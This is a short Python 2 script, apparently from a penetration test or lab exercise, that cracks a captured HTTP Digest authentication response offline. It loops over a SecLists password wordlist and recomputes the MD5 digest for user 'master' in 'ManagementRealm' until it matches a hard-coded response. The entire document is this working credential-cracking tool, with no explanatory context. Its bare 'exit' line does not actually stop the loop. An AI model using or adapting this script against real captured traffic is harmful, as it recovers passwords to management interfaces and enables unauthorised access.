import hashlib

with open("/mnt/c/Tools/SecLists-master/Passwords/darkweb2017-top1000.txt","r") as file1:
        passwordL = [line.rstrip() for line in file1] 

response="2cf88601becb070e2ea76fcfcda0e1fc"

for i in passwordL:
    authstr = "master:ManagementRealm:" + i
    h1=hashlib.md5(authstr).hexdigest()
    h2=hashlib.md5("GET:/management").hexdigest()
    nonce="AAAABQAAZsO0/W9fbE7WPM++6W44kTkERQsD+a9khhgtpzxJhekcN3956R4="
    cnonce="36978ce4c3368ab0"
    nc="00000001"
    qop="auth"
    rs = h1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + h2
    response1=hashlib.md5(rs).hexdigest()
    if response1 == response:
        print i
        exit
